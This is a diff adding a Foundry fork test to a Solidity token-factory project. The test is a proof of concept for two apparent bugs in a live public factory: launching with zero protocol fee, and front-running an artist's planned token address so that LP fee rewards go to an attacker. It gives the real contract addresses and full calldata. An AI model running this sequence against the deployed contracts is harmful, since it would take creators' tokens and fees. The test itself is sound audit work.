@@ -4,6 +4,10 @@ pragma solidity ^0.8.26;
 import {Test} from "forge-std/Test.sol";
 
 import {ArtCoinsToken} from "../../../../src/ArtCoinsToken.sol";
+import {IArtCoinsHookStaticFee} from "../../../../src/hooks/interfaces/IArtCoinsHookStaticFee.sol";
+import {IArtCoinsFactory} from "../../../../src/interfaces/IArtCoinsFactory.sol";
+import {IArtCoinsHook} from "../../../../src/interfaces/IArtCoinsHook.sol";
+import {IArtCoinsLpLocker} from "../../../../src/interfaces/IArtCoinsLpLocker.sol";
 
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
@@ -185,5 +189,101 @@ contract FactoryTokenForkTest is Test {
 
     function _id(PoolKey memory k) internal pure returns (PoolId) {
         return PoolId.wrap(keccak256(abi.encode(k)));
+    }
+
+    // ─── FT-02 / FT-03 live on the public "open" factory 0xf051 ───────────
+
+    address constant OPEN_FACTORY = 0xF051cd4C4F3F36F9f24d8a19d60Ee8F84FC6793e;
+    address constant OPEN_HOOK = 0xAAd673ea3945dF5F7Ef328974d2c07c8BdcAA8Cc;
+    address constant OPEN_LOCKER = 0xd914c864D9AEf3D8E51370139300aC534FB497b2;
+
+    function _openCfg(address admin, address rewardTo, bytes32 salt)
+        internal
+        pure
+        returns (IArtCoinsFactory.DeploymentConfig memory cfg)
+    {
+        cfg.tokenConfig = IArtCoinsFactory.TokenConfig({
+            tokenAdmin: admin,
+            name: "Planned Coin",
+            symbol: "PLAN",
+            salt: salt,
+            image: "",
+            metadata: "",
+            context: "",
+            totalSupply: 0,
+            renderer: address(0)
+        });
+        cfg.poolConfig = IArtCoinsFactory.PoolConfig({
+            hook: OPEN_HOOK,
+            pairedToken: address(0),
+            tickIfToken0IsArtCoins: -100_000,
+            tickSpacing: 200,
+            poolData: abi.encode(
+                IArtCoinsHook.PoolInitializationData({
+                    extension: address(0),
+                    extensionData: "",
+                    feeData: abi.encode(
+                        IArtCoinsHookStaticFee.PoolStaticConfigVars({artCoinFee: 10_000, pairedFee: 10_000})
+                    )
+                })
+            )
+        });
+        cfg.lockerConfig.locker = OPEN_LOCKER;
+        cfg.lockerConfig.rewardAdmins = new address[](1);
+        cfg.lockerConfig.rewardAdmins[0] = rewardTo;
+        cfg.lockerConfig.rewardRecipients = new address[](1);
+        cfg.lockerConfig.rewardRecipients[0] = rewardTo;
+        cfg.lockerConfig.rewardBps = new uint16[](1);
+        cfg.lockerConfig.rewardBps[0] = 10_000; // whole lp fee, no protocol slot
+        cfg.lockerConfig.tickLower = new int24[](1);
+        cfg.lockerConfig.tickUpper = new int24[](1);
+        cfg.lockerConfig.tickUpper[0] = 110_400;
+        cfg.lockerConfig.positionBps = new uint16[](1);
+        cfg.lockerConfig.positionBps[0] = 10_000;
+    }
+
+    /// @notice on the live, public, zero fee factory 0xf051 any address can
+    ///         (a) launch with protocol bps 0 and (b) take a planned token
+    ///         address by copying only the token config.
+    function test_bug_FT02_FT03_liveOpenFactoryHijackAndZeroProtocol() public {
+        if (!onFork) vm.skip(true);
+        IArtCoinsFactory f = IArtCoinsFactory(OPEN_FACTORY);
+        assertFalse(f.deprecated(), "open factory is public");
+        address artist = makeAddr("artist");
+        address attacker = makeAddr("attacker");
+        bytes32 salt = keccak256("planned");
+
+        uint256 snap = vm.snapshotState();
+        vm.prank(artist);
+        address planned = _deployOpen(_openCfg(artist, artist, salt));
+        vm.revertToState(snap);
+
+        vm.prank(attacker);
+        address got = _deployOpen(_openCfg(artist, attacker, salt));
+        assertEq(got, planned, "attacker took the planned address");
+        IArtCoinsLpLocker.TokenRewardInfo memory info =
+            IArtCoinsLpLocker(OPEN_LOCKER).tokenRewards(got);
+        assertEq(info.rewardRecipients.length, 1, "no protocol slot");
+        assertEq(info.rewardRecipients[0], attacker, "lp fees to attacker");
+
+        vm.prank(artist);
+        vm.expectRevert();
+        _deployOpen(_openCfg(artist, artist, salt));
+    }
+
+    function _deployOpen(IArtCoinsFactory.DeploymentConfig memory cfg) internal returns (address) {
+        (bool ok, bytes memory ret) = OPEN_FACTORY.call(
+            abi.encodeWithSignature(
+                "deployTokenWithProtocolBps(((address,string,string,bytes32,string,string,string,uint256,address),(address,address,int24,int24,bytes),(address,address[],address[],uint16[],int24[],int24[],uint16[],bytes),(address,bytes),(address,bool),(address,uint256,uint16,bytes)[]),uint16)",
+                cfg,
+                uint16(0)
+            )
+        );
+        if (!ok) {
+            assembly {
+                revert(add(ret, 0x20), mload(ret))
+            }
+        }
+        return abi.decode(ret, (address));
     }
 }
